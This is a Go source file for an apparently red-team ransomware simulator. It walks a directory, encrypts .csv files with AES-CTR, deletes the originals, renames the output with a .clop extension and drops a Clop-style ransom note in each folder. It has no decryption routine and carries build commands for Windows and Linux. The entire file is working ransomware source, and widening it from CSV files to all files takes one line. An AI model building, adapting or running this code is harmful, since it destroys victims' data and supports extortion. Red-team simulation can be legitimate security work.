package main

/*

Be VERY CAREFUL!!  Their is no decrypt function built at this time and the keys are not stored...
DANGER! DANGER!

*/

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
)

/*
Purpose:
Build an encrypter that encrypts the files in a provided path with the -path variable.  I also built a safegaurd to only encrypt csv files.

Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/encryptor"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

// To cross compile for linux
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o encryptor.bin -ldflags "-w -s" main.go

// To cross compile windows
GOOS=windows GOARCH=amd64 go build -o encryptor.exe -ldflags "-w -s" main.go

References:
https://github.com/mauri870/ransomware/blob/master/cryptofs/file.go

*/

type keyInfo struct {
	ID            string
	EncryptionKey string
}

type File struct {
	os.FileInfo
	Extension string // The file extension without dot
	Path      string // The absolute path of the file
}

type fileInfoStruct struct {
	fileFullPath  string
	fileOnlyPath  string
	fileExtension string
}

func GenerateRandomANString(size int) (string, error) {
	key := make([]byte, size)
	_, err := rand.Read(key)
	CheckError("Unable to create a random key", err, true)
	return hex.EncodeToString(key)[:size], nil
}

func CheckError(reasonString string, err error, exitBool bool) {
	if err != nil && exitBool == true {
		fmt.Printf("%s\n", reasonString)
		//fmt.Printf("%s\n\n", err)
		os.Exit(0)
	} else if err != nil && exitBool == false {
		fmt.Printf("%s\n", reasonString)
		//fmt.Printf("%s\n", err)
		return
	}
}

func (file *File) Encrypt(enckey string, dst io.Writer) error {
	// Open the file read only
	inFile, err := os.Open(file.Path)
	if err != nil {
		return err
	}
	defer inFile.Close()

	// Create a 128 bits cipher.Block for AES-256
	block, err := aes.NewCipher([]byte(enckey))
	if err != nil {
		return err
	}

	// The IV needs to be unique, but not secure
	iv := make([]byte, aes.BlockSize)
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
	stream := cipher.NewCTR(block, iv)

	// Write the Initialization Vector (iv) as the first block
	// of the dst writer
	dst.Write(iv)

	// Open a stream to encrypt and write to dst
	writer := &cipher.StreamWriter{S: stream, W: dst}

	// Copy the input file to the dst writer, encrypting as we go.
	if _, err = io.Copy(writer, inFile); err != nil {
		return err
	}

	return nil
}

func populateRansomNote() string {
	// Place the ransom note
	ransomMessage := `** Red Team Simulation **
Your network has been peentrated.
All files on each host in the network have been encrypted with a strong algorithm.
Backups were either encrypted or deleted or backup disks were formatted.
Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.
We exclusively have decryption software for your situation
No decryption software is available in the public.
DO NOT RESET OR SHUTDOWN – files may be damaged.
DO NOT RENAME OR MOVE the encrypted and readme files.
DO NOT DELETE readme files.
This may lead to the impossibility of recovery of the certain files.
Photorec, RannohDecryptor etc. repair tools are useless and can destroy your files irreversibly.
If you want to restore your files write to emails (contacts are at the bottom of the sheet) and attach 2-3 encrypted files
(Less than 5 Mb each, non-archived and your files should not contain valuable information
(Databases, backups, large excel sheets, etc.)).
You will receive decrypted samples and our conditions how to get the decoder.
	
Attention!!!
Your warranty - decrypted samples.
Do not rename encrypted files.
Do not try to decrypt your data using third party software.
We dont need your files and your information.
	
But after 2 weeks all your files and keys will be deleted automatically.
Contact emails:
redteam
	
The final price depends on how fast you write to us.
	
Clop - Red Team Simulation`
	return ransomMessage
}

func SaveOutputFile(message string, fileName string) {
	outFile, _ := os.Create(fileName)
	//CheckError("Unable to create txt file", err, true)
	defer outFile.Close()
	w := bufio.NewWriter(outFile)
	n, err := w.WriteString(message)
	if n < 1 {
		CheckError("Unable to write to txt file", err, true)
	}
	outFile.Sync()
	w.Flush()
	outFile.Close()
}

func main() {

	var kInfo keyInfo
	var err error
	var EOL string
	var pathString string

	// Specify the default path in the event one is not specified
	osType := runtime.GOOS
	if osType == "windows" {
		EOL = "\r\n"
		pathString = "c:\\shares\\music\\"
	} else {
		EOL = "\n"
		pathString = "/home/thepcn3rd/go/workspaces/encryptor/testFiles/"
	}

	pathPtr := flag.String("path", pathString, "Encrypt the files in the provided path")
	flag.Parse()

	kInfo.ID, err = GenerateRandomANString(32)
	CheckError("Unable to create a the Encryption Key ID", err, true)
	kInfo.EncryptionKey, err = GenerateRandomANString(32)
	CheckError("Unable to create a the Encryption Key", err, true)
	fmt.Printf("Encryption Key ID: %s%s", kInfo.ID, EOL)
	fmt.Printf("Encryption Key: %s%s", kInfo.EncryptionKey, EOL)
	// Send the key ID and the encryption Key to the server
	message := "Encryption Key ID: " + kInfo.ID + EOL + "Encryption Key: " + kInfo.EncryptionKey + EOL
	SaveOutputFile(message, "keyInformation.txt")

	// Walk the file path provided in the flag for encrypting files
	var fileList []fileInfoStruct
	fileCount := 0
	err = filepath.Walk(*pathPtr, func(path string, info os.FileInfo, err error) error {
		//err = filepath.Walk(pathString, func(path string, info os.FileInfo, err error) error {
		// Setup to only encrypt .csv files ** Done on purpose **
		if filepath.Ext(path) == ".csv" {
			var fStruct fileInfoStruct
			fStruct.fileExtension = filepath.Ext(path)
			fStruct.fileFullPath = path
			fStruct.fileOnlyPath = filepath.Dir(path)
			fileList = append(fileList, fStruct)
		}
		fileCount += 1
		return nil
	})
	CheckError("Unable to walk the file system at given path", err, true)
	previousRansomnotePath := ""
	ransomMessage := populateRansomNote()
	for f := range fileList {
		fmt.Printf("Encrypted File: %s%s", fileList[f].fileFullPath, EOL)
		// Open File
		file, err := os.Open(fileList[f].fileFullPath)
		CheckError("Unable to open file "+fileList[f].fileFullPath+" to encrypt!", err, false)
		defer file.Close()

		fstat, err := file.Stat()
		fileInfo := &File{fstat, fileList[f].fileExtension, fileList[f].fileFullPath}

		// Pass the file to be encrypted
		var buf []byte
		buffer := bytes.NewBuffer(buf)
		err = fileInfo.Encrypt(kInfo.EncryptionKey, buffer)
		CheckError("Unable to encrypt file", err, false)

		ransomFilePath := fileList[f].fileFullPath + ".clop"
		outputFile, err := os.Create(ransomFilePath)
		CheckError("Unable to create the encrypted file", err, false)
		outputFile.Write(buffer.Bytes())
		outputFile.Close()
		file.Close()
		os.Remove(fileList[f].fileFullPath)
		// Only write the clopreadme file if it does not exist in the path...
		if fileList[f].fileOnlyPath != previousRansomnotePath {
			ransomNotePath := fileList[f].fileOnlyPath + "/ClopReadMe.txt"
			outputNoteFile, err := os.Create(ransomNotePath)
			CheckError("Unable to create the encrypted file", err, false)
			outputNoteFile.Write([]byte(ransomMessage))
			outputNoteFile.Close()
			previousRansomnotePath = fileList[f].fileOnlyPath
		}

	}
}
